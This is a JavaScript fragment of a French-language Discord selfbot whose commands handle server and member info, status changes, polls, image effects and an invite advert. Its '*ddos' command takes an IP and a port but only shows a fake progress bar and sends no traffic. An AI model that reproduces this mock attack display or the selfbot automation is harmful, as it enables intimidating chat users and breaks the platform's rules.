   if (cmd == "*ddos") { if (message.author.id != "174913532687548416") return; if (message.deletable) message.delete(); let ip = args[0]; let port = args[1]; let ddosembed = new discord.RichEmbed().setTitle("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟").setColor("#1a1aff").setThumbnail(bot.user.avatarURL).addField("𝐈𝐏:", ip).addField("𝐏𝐎𝐑𝐓:", port).setFooter(`🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀`); message.channel.send(ddosembed); let charge = "."; let chargeC = "¦"; message.channel.send("```[" + charge.repeat(40) + "]```").then((message) => { for (i = 0; i <= 40; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%```"); } }) }
   if (cmd == `*sinfo`) { if (message.author.id != "174913532687548416") return; message.channel.bulkDelete(1); let sicon = message.guild.iconURL; let serverembed = new discord.RichEmbed().setDescription("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟").setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀").setThumbnail("http://image.noelshack.com/fichiers/2018/52/7/1546149106-babybossdestroy.jpg").setImage("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif").setColor("#1a1aff").setThumbnail(sicon).addField("☣️ 𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞:", message.guild.name).addField("☣️ 𝐈𝐃:", message.guild.id).addField("☣️ 𝐎𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫:", message.guild.owner.user).addField("☣️ 𝐑𝐞𝐠𝐢𝐨𝐧:", message.guild.region).addField("☣️ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥:", message.guild.verificationLevel).addField("☣️ 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐎𝐧:", message.guild.createdAt).addField("☣️ 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝:", message.member.joinedAt).addField("☣️ 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐛𝐞𝐫𝐬:", message.guild.memberCount); return message.channel.send(serverembed); }
   if (cmd == `*minfo`){ 
    if (message.author.id != "174913532687548416") return;
    if (message.deletable) message.delete();
    let mention = message.mentions.members.first();
    let micon = mention.user.avatarURL; let memberembed = new discord.RichEmbed()
    .setDescription("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟").setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀").setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif").setImage("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif").setColor("#090000")
    .setThumbnail(micon)
    .addField("☣️ 𝐓𝐀𝐆 𝐝𝐞 𝐥𝐚 𝐩𝐫𝐨𝐢𝐞:", mention.user.tag)
    .addField("☣️ 𝐈𝐃 𝐝𝐞 𝐜𝐞 𝐬𝐢𝐧𝐠𝐞 !:", mention.user.id)
    .addField("☣️ 𝐆𝐚𝐦𝐞 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 !:", mention.presence.game)
    .addField("☣️ 𝐍𝐨𝐦 𝐝𝐞 𝐭𝐚 𝐩𝐫𝐨𝐢𝐞 !:", mention.user.username)
    .addField("☣️ 𝐍𝐨𝐦𝐛𝐫𝐞𝐬 𝐝𝐞 𝐫𝐨𝐥𝐞 !:", mention.roles.size - 1)
    .addField("☣️ 𝐃𝐚𝐭𝐞 𝐝𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐝𝐞 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 !:", mention.user.createdAt)
    .addField("☣️ 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed); };

    
    if (cmd === prefix + "8ball"){
        if (!args[1]) return message.reply("Tu n'as pas posé de question !");
    
        let replies = ["Oui", "Non", "Peux être", "Je ne sais pas", "C'est impossible !", "Probablement..", "Hors de question !", "Pourquoi pas?"]
        let question = args.slice(0).join(" ");
        let res = Math.floor((Math.random() * replies.length));
    
        let bembed = new discord.RichEmbed()
            .setColor("RANDOM")
            .setTitle("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField(`Question de ${message.author.tag}`, question)
            .addField("Réponse : ", replies[res])
            message.channel.sendEmbed(bembed);
        }
        if (message.content === prefix + "maj"){
            if (message.author.id != "174913532687548416") return;
             if (message.deletable) message.delete();
             let help_embed = new discord.RichEmbed()
             .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
             .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
             .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
             .setColor("RANDOM")
                 .addField("  -| 𝑻𝒘𝒆𝒆𝒕𝒆𝒓  |-  ", ":bird:   *𝒕𝒘𝒆𝒆𝒕 [𝒂𝒖𝒕𝒆𝒖𝒓] [𝒕𝒘𝒆𝒆𝒕]: `𝒄𝒓𝒆́𝒆𝒓 𝒖𝒏 𝒕𝒘𝒆𝒆𝒕 ! ` \n" + "󠂪")
                 .addField("  -| 𝑺𝒐𝒏𝒅𝒂𝒈𝒆 |-  ", "✏️  *𝒔𝒐𝒏𝒅𝒂𝒈𝒆 [𝒕𝒆𝒙𝒕𝒆] : `𝑪𝒓𝒆́𝒆𝒓 𝒖𝒏 𝒔𝒐𝒏𝒅𝒂𝒈𝒆 !` \n" + "󠂪")
                 .addField("  -| 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑰𝒏𝒗𝒊𝒔𝒊𝒃𝒍𝒆 |-  ", "🌐  *𝒐𝒇𝒇𝒍𝒊𝒏𝒆 : `𝑻𝒆 𝒎𝒆𝒕𝒔 𝒆𝒏 𝒔𝒕𝒂𝒕𝒖𝒔 𝑯𝒐𝒓𝒔-𝑳𝒊𝒈𝒏𝒆 !` \n" + "󠂪")
                 .addField("  -| 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑶𝒏𝒍𝒊𝒏𝒆 |-  ", "🌐  *𝒐𝒏𝒍𝒊𝒏𝒆 : `𝑻𝒆 𝒎𝒆𝒕𝒔 𝒆𝒏 𝒔𝒕𝒂𝒕𝒖𝒔 𝑶𝒏𝒍𝒊𝒏𝒆 !` \n" + "󠂪")
                 .addField("  -| 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑵𝒆 𝒑𝒂𝒔 𝒅𝒆́𝒓𝒂𝒏𝒈𝒆𝒓 |-  ", "🌐  *𝒅𝒏𝒅 : `𝑻𝒆 𝒎𝒆𝒕𝒔 𝒆𝒏 𝒔𝒕𝒂𝒕𝒖𝒔 𝑵𝒆 𝒑𝒂𝒔 𝒅𝒆́𝒓𝒂𝒏𝒈𝒆𝒓 !` \n" + "󠂪")
                 .addField("  -| 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑰𝒏𝒂𝒄𝒕𝒊𝒇 |-  ", "🌐  *𝒊𝒅𝒍𝒆 : `𝑻𝒆 𝒎𝒆𝒕𝒔 𝒆𝒏 𝒔𝒕𝒂𝒕𝒖𝒔 𝑰𝒏𝒂𝒄𝒕𝒊𝒇 !` \n" + "󠂪")
                 .addField("  -| 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑴𝒂𝒈𝒊𝒌 |-  ", "🌐  *𝒎𝒂𝒈𝒊𝒌 : `𝑻𝒓𝒂𝒏𝒔𝒇𝒐𝒓𝒎𝒆 𝒖𝒏𝒆 𝒊𝒎𝒂𝒈𝒆 𝒆𝒏 𝑴𝒂𝒈𝒊𝒌 !` \n" + "󠂪")
             message.channel.sendEmbed(help_embed);
            }
            else if(cmd == prefix + "dnd"){
                if (message.author.id != "174913532687548416") return;
                bot.user.setStatus("dnd")
                message.edit("**:white_check_mark: Le status est désormais en ne pas deranger**")
            }else if(cmd == prefix + "online"){
                if (message.author.id != "174913532687548416") return;
                bot.user.setStatus("online")
                message.edit("**:white_check_mark: Le status est désormais en ligne**")
            }else if(cmd == prefix + "offline"){
                if (message.author.id != "174913532687548416") return;
                bot.user.setStatus("invisible")
                message.edit("**:white_check_mark: Le status est désormais en invisible**")
            }else if(cmd == prefix + "idle"){
                if (message.author.id != "174913532687548416") return;
                bot.user.setStatus("idle")
                message.edit("**:white_check_mark: Le status est désormais en inactif**")
            }
            if(cmd == prefix + "tweet"){
                if (message.author.id != "174913532687548416") return;
                if(!args[1])return
                fetch(`https://nekobot.xyz/api/imagegen?type=tweet&username=${args.shift()}&text=${encodeURIComponent(args.join(" "))}`)
                .then(res => {
                    res.json()
                    .then(json => {
                        var embed = new discord.RichEmbed()
                        .setTitle("tweet")
                        .setImage(json.message)
                        message.edit(embed)
                    })
                })
            }

        if(cmd == prefix + "sondage"){
            if (message.author.id != "174913532687548416") return;
            var text = args.join(" ")
            if(!text)return message.edit("Ajoutez une question pour le sondage")
            var embed = new discord.RichEmbed()
            .setDescription(text)
            .setColor("RANDOM")
            .setTimestamp()
            .setFooter("Réagissez avec les emojis, 👍, 👎 ou 🤷‍", bot.image)
            message.edit(embed)
            .then(msg => {
              msg.react("👍")
              .then(() => {
                msg.react("👎")
                .then(() => {
                  msg.react("🤷")
                })
              })
            })
          }
          if(cmd == prefix + "magik"){
            if(message.attachments.first())var url = message.attachments.first().url
            else if(bot.users.get(args[0]))var url = bot.users.get(args[0]).avatar ? `https://cdn.discordapp.com/avatars/${bot.users.get(args[0]).id}/${bot.users.get(args[0]).avatar}.${bot.users.get(args[0]).avatar.startsWith("a_") ? "gif" : "png"}?size=2048` : `https://cdn.discordapp.com/embed/avatars/${bot.users.get(args[0]).discriminator % 5}.png`
            else if(message.mentions.users.first())var url = message.mentions.users.first().avatar ? `https://cdn.discordapp.com/avatars/${message.mentions.users.first().id}/${message.mentions.users.first().avatar}.${message.mentions.users.first().avatar.startsWith("a_") ? "gif" : "png"}?size=2048` : `https://cdn.discordapp.com/embed/avatars/${message.mentions.users.first().discriminator % 5}.png`
            else var url = message.author.avatar ? `https://cdn.discordapp.com/avatars/${message.author.id}/${message.author.avatar}.${message.author.avatar.startsWith("a_") ? "gif" : "png"}?size=2048` : `https://cdn.discordapp.com/embed/avatars/${message.author.discriminator % 5}.png`
            
            fetch(`https://nekobot.xyz/api/imagegen?type=magik&image=${encodeURIComponent(url)}`, {
                method: "get",
                headers: {
                    "Content-Type": "application/json"
                }
            }).then(res => {
                res.json()
                .then(json => {
                    if(res.status !== 200){
                        message.edit("Je ne peux pas générer une image actuellement.\n\nerreur: `" + json.message + "`")
                        return
                    }
                    var embed = new discord.RichEmbed()
                    .setImage(json.message)
                    .setColor("random")
                    .setTitle("mAgIk")
                    .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
                    message.delete()
                    message.channel.send(embed)
                })
            })
        
        }
    
        if ( cmd === prefix + "watch") {
            if (message.author.id != "174913532687548416") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicer le watch que tu souhaites.");
    
            let WatchTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"})
        }
    
        if ( cmd === prefix + "stream") {
            if (message.author.id != "174913532687548416") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicer le stream que tu souhaites.");
    
            let StreamTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/twitch'})
        }
    
        if ( cmd === prefix + "listen") {
            if (message.author.id != "174913532687548416") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicer le listen que tu souhaites.");
    
            let ListenTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${ListenTime}`, {type: "LISTENING"})
        }
        if ( cmd === prefix + "play") {
            if (message.author.id != "174913532687548416") return;
            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicer le play que tu souhaites.");
    
            let PlayTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"})
        }
        if (message.content === "*pub"){
            if (message.deletable) message.delete();
            if (message.author.id != "174913532687548416") return;
            let help_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🌇 - *`https://discord.gg/wYEYCBY`*")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🌇 - *`https://discord.gg/wYEYCBY`*")
            .setColor("RANDOM")
            message.channel.sendEmbed(help_embed);
            console.log("Commande pub demandée.")
            
        }
    

});